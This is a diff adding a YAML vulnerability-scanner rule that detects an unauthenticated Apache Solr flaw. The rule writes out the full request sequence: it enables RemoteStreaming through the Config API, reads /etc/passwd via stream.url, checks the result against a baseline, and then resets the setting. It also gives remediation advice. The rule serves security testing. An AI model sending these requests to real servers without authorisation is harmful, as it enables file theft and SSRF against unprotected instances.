@@ -1,0 +1,79 @@
+schema_version: 1
+id: "cortex.official:solr-remote-streaming-file-read"
+rule_version: "1.0.0"
+requires:
+  engine_api: 1
+  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.file_read_differential.v1"]
+info:
+  name: "Apache Solr RemoteStreaming arbitrary file read (unauth Config API + stream.url)"
+  description: >
+    Solr ships without authentication, so an anonymous client can set
+    requestDispatcher.requestParsers.enableRemoteStreaming=true through the Config API and then make the
+    DumpRequestHandler fetch a URL of its choosing — file:// reads any file the Solr process can read, http:// is a
+    blind SSRF. This rule proves the read differentially: a clean dump request (same handler, no stream.url) must NOT
+    carry file contents, while stream.url=file:///etc/passwd must return a /etc/passwd-shaped marker; the property is
+    switched back off in cleanup. Verified against Solr 8.8.1, where enableRemoteStreaming still defaults to true once
+    the property is written; newer releases require the same anonymous Config API write, so the access-control failure
+    this rule pins is unchanged.
+  references:
+    - "https://github.com/vulhub/vulhub/tree/master/solr/Remote-Streaming-Fileread"
+  cwes: [22, 918]
+  tags: ["solr", "file-read", "ssrf", "config-api"]
+  remediation: >
+    Put Solr behind authentication (security.json / a reverse proxy) and never expose the Config API anonymously;
+    keep requestDispatcher.requestParsers.enableRemoteStreaming=false and do not enable the DumpRequestHandler with
+    remote streaming on an internet-facing instance.
+finding:
+  sink_type: "SSRF"
+  impact: "FILE_READ"
+  severity: "High"
+  cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+  root_cause: "enabled-remote-streaming"
+execution:
+  auth: "anonymous"
+  # The exploit needs a config write (and cleanup undoes it), so this is not a read-only rule.
+  side_effects: "state_change"
+  transport: "http"
+# Discovery: the Solr admin API with the lab's `demo` core. preconditions gate the rule, so a non-Solr target (or a
+# Solr without that core) is NotApplicable instead of a confusing NoMatch.
+discovery:
+  - id: "cores"
+    request: { method: "GET", path: "/solr/admin/cores?indexInfo=false&wt=json" }
+preconditions:
+  all:
+    - eq: { left: { ref: "steps.cores.status" }, right: { value: 200 } }
+    - contains: { left: { ref: "steps.cores.body" }, right: { value: '"demo"' } }
+steps:
+  # Clean baseline for the differential: the DumpRequestHandler WITHOUT stream.url. It must not carry file contents,
+  # so a target that has RemoteStreaming disabled (or a patched build) is a clean NoMatch, never a guess.
+  - id: "baseline"
+    request: { method: "GET", path: "/solr/demo/debug/dump?param=ContentStreams" }
+  # The access-control failure being pinned: an anonymous Config API write switches RemoteStreaming on.
+  - id: "enable"
+    request:
+      method: "POST"
+      path: "/solr/demo/config"
+      json_body:
+        set-property:
+          requestDispatcher.requestParsers.enableRemoteStreaming: true
+  # file:// through stream.url: the handler streams the file's bytes into the response (plaintext inside the JSON dump
+  # on 8.x), which is what the marker matches. The scheme is percent-encoded on purpose: a request PATH must stay
+  # host-relative (the validator rejects '://' so a rule can never turn the scanner into an open proxy), and every
+  # query-string parser — Solr's included — decodes %3A%2F%2F back to '://' before the handler sees it.
+  - id: "probe"
+    request: { method: "GET", path: "/solr/demo/debug/dump?param=ContentStreams&stream.url=file%3A%2F%2F%2Fetc%2Fpasswd" }
+proof:
+  kind: "file_read_differential.v1"
+  baseline: { step: "baseline" }
+  probe:
+    - { step: "probe" }
+  marker: { regex: "root:x:0:0:" }
+# Compensation: the property the exploit turned on is switched off again, so the target is left as it was found.
+cleanup:
+  - id: "disable"
+    request:
+      method: "POST"
+      path: "/solr/demo/config"
+      json_body:
+        set-property:
+          requestDispatcher.requestParsers.enableRemoteStreaming: false
